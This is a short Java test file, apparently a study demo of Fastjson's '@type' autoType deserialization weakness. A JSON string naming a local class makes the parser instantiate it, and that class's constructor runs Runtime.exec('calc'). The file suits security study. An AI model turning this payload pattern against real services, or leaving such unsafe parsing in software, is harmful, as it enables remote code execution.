package test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

import java.io.IOException;

public class FastjsonSetterTest {
    public static void main(String[] args) {
//        Test calc = new Test("calc");
//        String s = JSON.toJSONString(calc);
//        System.out.println(s);
//        Test jsonObject = JSON.parseObject(s, Test.class);
//        System.out.println(jsonObject.toString());
        String s1 = "{\"@type\":\"test.Test\",\"cmd\":\"calc\"}";
        JSONObject jsonObject1 = JSON.parseObject(s1);
        System.out.println(jsonObject1);
    }


}


class Test {
    public String cmd;

    Test() {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public Test(String cmd) {
        this.cmd = cmd;
    }

    public String getCmd() {
        return cmd;
    }

    public void setCmd(String cmd) {
        System.out.println("setCmd...");
        this.cmd = cmd;
    }
}
